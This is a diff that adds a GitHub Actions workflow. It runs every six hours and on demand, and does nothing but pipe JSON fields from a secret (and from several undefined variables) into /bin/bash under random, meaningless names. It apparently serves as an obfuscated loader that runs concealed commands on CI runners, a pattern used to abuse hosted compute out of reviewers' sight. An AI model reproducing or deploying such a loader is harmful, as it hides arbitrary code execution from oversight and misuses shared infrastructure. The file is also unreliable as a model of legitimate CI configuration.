@@ -1,0 +1,24 @@
+name: zhangjinluo8901
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangjinluo8901
+        env:
+          qxfs84: ${{ secrets.qxfs84 }}
+        run: |
+          echo $qxfs84 | jq -r .v2 | /bin/bash
+          echo $t5985 | jq -r .zal4 | /bin/bash
+          echo $s911 | jq -r .jss058 | /bin/bash
+          echo $vwfxt6843 | jq -r .qdbv4 | /bin/bash
+          echo $vmgyv3741 | jq -r .zm6955 | /bin/bash
+          echo $p20988 | jq -r .oji74 | /bin/bash
+          echo $pkc31961 | jq -r .ynkc88169 | /bin/bash
+          echo $tzjh084 | jq -r .t27 | /bin/bash
+
